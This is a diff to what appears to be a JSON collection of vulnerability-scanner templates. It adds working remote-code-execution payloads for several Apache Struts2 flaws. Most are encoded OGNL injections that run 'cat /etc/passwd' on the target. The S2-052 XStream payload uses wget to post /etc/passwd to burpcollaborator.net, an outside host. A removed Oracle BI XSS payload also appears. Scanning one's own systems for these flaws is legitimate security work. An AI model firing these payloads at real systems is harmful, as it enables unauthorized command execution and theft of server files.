@@ -35,6 +35,44 @@
       ]
     },
     {
+      "id": "CVE-2007-4556",
+      "info": {
+        "author": "pikpikcu",
+        "name": "Apache Struts2 S2-001 RCE",
+        "reference": "https://www.guildhab.top/?p=2326",
+        "severity": "critical",
+        "tags": "cve,cve2007,apache,rce,struts"
+      },
+      "requests": [
+        {
+          "body": "username=test&password=%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22cat%22%2C%22%2Fetc%2Fpasswd%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D\n",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "matchers": [
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/login.action"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2008-2398",
       "info": {
         "author": "unstabl3",
@@ -144,13 +182,83 @@
       ]
     },
     {
+      "id": "CVE-2012-0392",
+      "info": {
+        "author": "pikpikcu",
+        "name": "Apache Struts2 S2-008 RCE",
+        "reference": "https://blog.csdn.net/weixin_43416469/article/details/113850545",
+        "severity": "critical",
+        "tags": "cve, cve2012,apache,rce,struts"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/devmode.action?debug=command&expression=(%23_memberAccess[%22allowStaticMethodAccess%22]%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D%23foo%2C@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27cat%20/etc/passwd%27).getInputStream()))"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2013-1965",
+      "info": {
+        "author": "pikpikcu",
+        "name": "Apache Struts2 S2-012 RCE",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2013-1965",
+        "severity": "critical",
+        "tags": "cve,cve2013,apache,rce,struts"
+      },
+      "requests": [
+        {
+          "body": "name=%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22cat%22%2C+%22%2Fetc%2Fpasswd%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D\n",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/user.action"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2013-2251",
       "info": {
         "author": "exploitation & @dwisiswant0",
         "description": "In Struts 2 before 2.3.15.1 the information following \"action:\", \"redirect:\" or \"redirectAction:\" is not properly sanitized. Since said information will be evaluated as OGNL expression against the value stack, this introduces the possibility to inject server side code.",
         "name": "Apache Struts 2 - DefaultActionMapper Prefixes OGNL Code Execution",
         "severity": "critical",
-        "tags": "cve,cve2013,rce"
+        "tags": "cve,cve2013,rce,struts,apache"
       },
       "requests": [
         {
@@ -363,7 +471,7 @@
         "name": "S2-032 Struts RCE",
         "reference": "https://cwiki.apache.org/confluence/display/WW/S2-032",
         "severity": "high",
-        "tags": "cve,cve2016,struts,rce"
+        "tags": "cve,cve2016,struts,rce,apache"
       },
       "requests": [
         {
@@ -551,6 +659,39 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/search/members/?id`%3D520)%2f**%2funion%2f**%2fselect%2f**%2f1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2Cunhex%28%2770726f6a656374646973636f766572792e696f%27%29%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%2C31%2C32%23sqli=1"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2017-12611",
+      "info": {
+        "author": "pikpikcu",
+        "name": "Apache Struts2 S2-053 RCE",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-12611",
+        "severity": "critical",
+        "tags": "cve,cve2017,apache,rce,struts"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/?name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27cat%20/etc/passwd%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D"
           ]
         }
       ]
@@ -787,9 +928,9 @@
       "info": {
         "author": "Random Robbie",
         "description": "Struts is vulnerable to remote command injection attacks through incorrectly parsing an attacker’s invalid Content-Type HTTP header. The Struts vulnerability allows these commands to be executed under the privileges of the Web server.",
-        "name": "Struts2 RCE ",
+        "name": "Struts2 RCE",
         "severity": "critical",
-        "tags": "cve,cve2017,struts,rce"
+        "tags": "cve,cve2017,struts,rce,apache"
       },
       "requests": [
         {
@@ -954,6 +1095,91 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/plugins/servlet/oauth/users/icon-uri?consumerUri=https://ipinfo.io/json"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2017-9791",
+      "info": {
+        "author": "pikpikcu",
+        "name": "Apache Struts2 S2-053 RCE",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-9791",
+        "severity": "critical",
+        "tags": "cve, cve2017,apache,rce"
+      },
+      "requests": [
+        {
+          "body": "name=%25%7b%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%3f%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%3d%23%64%6d%29%3a%28%28%23%63%6f%6e%74%61%69%6e%65%72%3d%23%63%6f%6e%74%65%78%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%3d%23%63%6f%6e%74%61%69%6e%65%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%6f%6e%74%65%78%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%29%29%2e%28%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%2e%28%23%71%29%7d&age=10&__checkbox_bustedBefore=true&description=\n",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "matchers": [
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "Content-Type: text/html"
+              ]
+            },
+            {
+              "condition": "and",
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/integration/saveGangster.action"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2017-9805",
+      "info": {
+        "author": "pikpikcu",
+        "name": "Apache Struts2 S2-052 RCE",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-9805",
+        "severity": "critical",
+        "tags": "cve,cve2017,apache,rce,struts"
+      },
+      "requests": [
+        {
+          "body": "<map>\n  <entry>\n    <jdk.nashorn.internal.objects.NativeString>\n      <flags>0</flags>\n      <value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\">\n        <dataHandler>\n          <dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\">\n            <is class=\"javax.crypto.CipherInputStream\">\n              <cipher class=\"javax.crypto.NullCipher\">\n                <initialized>false</initialized>\n                <opmode>0</opmode>\n                <serviceIterator class=\"javax.imageio.spi.FilterIterator\">\n                  <iter class=\"javax.imageio.spi.FilterIterator\">\n                    <iter class=\"java.util.Collections$EmptyIterator\"/>\n                    <next class=\"java.lang.ProcessBuilder\">\n                      <command>\n                        <string>wget</string>\n                        <string>--post-file</string>\n                        <string>/etc/passwd</string>\n              <string>burpcollaborator.net</string>\n                      </command>\n                      <redirectErrorStream>false</redirectErrorStream>\n                    </next>\n                  </iter>\n                  <filter class=\"javax.imageio.ImageIO$ContainsFilter\">\n                    <method>\n                      <class>java.lang.ProcessBuilder</class>\n                      <name>start</name>\n                      <parameter-types/>\n                    </method>\n                    <name>asdasd</name>\n                  </filter>\n                  <next class=\"string\">asdasd</next>\n                </serviceIterator>\n                <lock/>\n              </cipher>\n              <input class=\"java.lang.ProcessBuilder$NullInputStream\"/>\n              <ibuffer></ibuffer>\n              <done>false</done>\n              <ostart>0</ostart>\n              <ofinish>0</ofinish>\n              <closed>false</closed>\n            </is>\n            <consumed>false</consumed>\n          </dataSource>\n          <transferFlavors/>\n        </dataHandler>\n        <dataLen>0</dataLen>\n      </value>\n    </jdk.nashorn.internal.objects.NativeString>\n    <jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/>\n  </entry>\n  <entry>\n    <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n    <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n  </entry>\n</map>\n",
+          "headers": {
+            "Content-Type": "application/xml"
+          },
+          "matchers": [
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "Debugging information",
+                "com.thoughtworks.xstream.converters.collections.MapConverter"
+              ]
+            },
+            {
+              "status": [
+                500
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/struts2-rest-showcase/orders/3",
+            "{{BaseURL}}/orders/3"
           ]
         }
       ]
@@ -1176,6 +1402,39 @@
           "path": [
             "{{BaseURL}}/jkstatus",
             "{{BaseURL}}/jkstatus;"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-11776",
+      "info": {
+        "author": "pikpikcu",
+        "name": "Apache Struts2 S2-057 RCE",
+        "reference": "https://github.com/jas502n/St2-057",
+        "severity": "critical",
+        "tags": "cve,cve2018,apache,rce,struts2"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/etc/passwd%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D/actionChain1.action"
           ]
         }
       ]
@@ -4923,44 +5182,6 @@
       ]
     },
     {
-      "id": "CVE-2020-14815",
-      "info": {
-        "author": "pikpikcu",
-        "name": "Oracle Business Intelligence XSS",
-        "reference": "https://www.oracle.com/security-alerts/cpuoct2020.html",
-        "severity": "medium",
-        "source": "https://twitter.com/HackerOn2Wheels/status/1326927875279380480",
-        "tags": "cve,cve2020,oracle,xss"
-      },
-      "requests": [
-        {
-          "matchers": [
-            {
-              "status": [
-                200
-              ],
-              "type": "status"
-            },
-            {
-              "condition": "and",
-              "part": "header",
-              "type": "word",
-              "words": [
-                "X-Oracle-Dms-Ecid:",
-                "X-Oracle-Dms-Rid:",
-                "Set-Cookie:"
-              ]
-            }
-          ],
-          "matchers-condition": "and",
-          "method": "GET",
-          "path": [
-            "{{BaseURL}}/bi-security-login/login.jsp?msi=false&redirect=%22%3E%3Cimg/src/onerror%3dalert(document.domain)%3E"
-          ]
-        }
-      ]
-    },
-    {
       "id": "CVE-2020-14864",
       "info": {
         "author": "Ivo Palazzolo (@palaziv)",
@@ -5470,7 +5691,7 @@
         "name": "Apache Struts RCE",
         "reference": "http://packetstormsecurity.com/files/160721/Apache-Struts-2-Forced-Multi-OGNL-Evaluation.html",
         "severity": "critical",
-        "tags": "cve,cve2020,apache,rce"
+        "tags": "cve,cve2020,apache,rce,struts"
       },
       "requests": [
         {
@@ -8087,7 +8308,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /Config/SaveUploadedHotspotLogoFile HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarySHHbUsfCoxlX1bpS\nAccept: application/json\nReferer: {{BaseURL}}\nConnection: close\nX-Requested-With: XMLHttpRequest\n\n------WebKitFormBoundarySHHbUsfCoxlX1bpS\nContent-Disposition: form-data; name=\"file\"; filename=\"poc.txt\"\nContent-Type: imnage/png\n\nPOC_TEST\n\n------WebKitFormBoundarySHHbUsfCoxlX1bpS\n",
+            "POST /Config/SaveUploadedHotspotLogoFile HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarySHHbUsfCoxlX1bpS\nAccept: application/json\nReferer: {{BaseURL}}\nConnection: close\nX-Requested-With: XMLHttpRequest\n\n------WebKitFormBoundarySHHbUsfCoxlX1bpS\nContent-Disposition: form-data; name=\"file\"; filename=\"poc.txt\"\nContent-Type: image/png\n\nPOC_TEST\n\n------WebKitFormBoundarySHHbUsfCoxlX1bpS\n",
             "GET /Assets/temp/hotspot/img/logohotspot.txt HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
